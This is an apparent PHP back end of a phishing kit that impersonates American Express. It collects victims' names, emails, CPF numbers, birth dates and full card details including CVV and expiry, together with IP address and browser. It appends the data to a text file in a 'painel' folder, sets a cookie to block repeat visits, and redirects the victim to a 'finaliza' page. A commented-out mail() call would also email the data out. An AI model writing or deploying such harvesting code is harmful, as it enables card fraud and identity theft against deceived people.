<meta http-equiv="refresh" content="2; url=finaliza.php?Fiasiaji44jisajifih4jisajifihashuasufuitqio4ji4jisajifihashuasufuitqioesajifihashuasufuitqioeeashuasufuitqioe4jisajifihashuasufuitqioejisajifihashuasufuitqioe">
<?php

date_default_timezone_set('America/Sao_Paulo');
 $date      = mktime(date('H')-3, date('i'), date('s'), date('m'), date('d'), date('Y'));
 $day       = gmdate('d/m/Y', $date);   // Dia  ex: 01/01/2070 ;)
 $time      = gmdate('H:i:s', $date);   // Hora ex: 00:00:00
 $time_two  = gmdate('H-i-s', $date);   // Hora ex: 00:00:00
 $plog_ip   = $_SERVER['REMOTE_ADDR']  ? $_SERVER['REMOTE_ADDR']  : 'N/A';
 $plog_host = @gethostbyaddr($plog_ip) ? @gethostbyaddr($plog_ip) : 'N/A';
 $plog_info = $day.'' .$time. ' [ ' .$plog_ip. ' | ' .$plog_host. ']'; 
 $plog_save = $plog_ip .$plog_host; 
 $useragent = $_SERVER['HTTP_USER_AGENT'];
   if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }  
$cpf        = $_POST["cpf"];
$email         = $_POST["email"];
$name  = $_POST["name"];
$dia_nascimento      = $_POST["dia_nascimento"];
$mes_nascimento     = $_POST["mes_nascimento"];
$ano_nascimento        = $_POST["ano_nascimento"];
$nome_card         = $_POST["nome_card"];
$num_card  = $_POST["num_card"];
$cvv      = $_POST["cvv"];
$mes_card  = $_POST["mes_card"];
$ano_card      = $_POST["ano_card"];


$ip = $_SERVER["REMOTE_ADDR"];
$dtehr = date("d-m-y H-i-s");
$msg = "
| ------------- AMEX -------------- 
| Navegador: $browser $browser_version
| IP: $ip
| Data/hora: $dtehr
| -------- TIPO $pessoa -------- 
|
| Nome Completo.......: $name
| Email.....: $email
| CPF.......: $cpf
| Dia Nascimento.......: $dia_nascimento
| Mes Nascimento.......: $mes_nascimento
| Ano Nascimento....: $ano_nascimento
| Nome Cartao....: $nome_card
| Numero Cartao....: $num_card
| Cod Cartao....: $cvv
| Mes Cartao....: $mes_card
| Ano Cartao....: $ano_card
| ------------------------------
";


$msg2 = "<html>
<body><font face=\"Courier\">
<br>| ------------- AMEX -------------- 
<br>| Navegador: <b>$browser $browser_version</b>
<br>| IP: <b>$ip</b>
<br>| Data/hora: <b>$dtehr</b>
<br>|
<br>| Nome Completo.......: <b>$name</b>
<br>| Email.....: <b>$email</b>
<br>| CPF........: <b>$cpf</b>
<br>| Data Nascimento.......: <b>$dia_nascimento-$mes_nascimento-$ano_nascimento</b>
<br>| Nome Cartao........: <b>$nome_card</b>
<br>| Numero Cartao.......: <b>$num_card</b>
<br>| Cod CARTAO.......: <b>$cvv</b>
<br>| Validade Cartao........: <b>$mes_card-$ano_card</b>
<br>|
<br>| -------------------------------- </font></html></body>";

//$email = "email_aqui_mas_nao_funciona";



$assunto = "AMEX - $usuario - $txtCampo22";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: AMEX <amex@sac.info>";

$file = "painel/" . "Amex - $ip - $$ " . ".txt";
$open = fopen("$file","a+");
$quebra = chr(13).chr(10);
fwrite($open, $msg);
fclose($open);

$conteudo  = "bloquear";
setcookie("login", $conteudo, time() + (1 * 24 * 3600)); 

//mail($email, $assunto, $msg2, $headers);
?>
<?php header("Location: finaliza.php?Fiasiaji44jisajifih4jisajifihashuasufuitqio4ji4jisajifihashuasufuitqioesajifihashuasufuitqioeeashuasufuitqioe4jisajifihashuasufuitqioejisajifihashuasufuitqioe"); ?>